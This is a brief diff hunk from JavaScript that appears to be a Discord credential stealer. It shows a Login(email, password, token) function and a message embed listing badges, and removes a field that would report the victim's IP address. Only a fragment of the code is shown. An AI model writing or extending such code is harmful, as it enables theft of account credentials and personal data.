@@ -162,7 +162,6 @@ function Login(email, password, token) {
 
                            **Badges:** ${GetBadges(json.flags)}`,
 
-                            "value": `\`\`\` \nIP: \n${o}\n}\`\`\``, inline: !1 
 
         
                         },
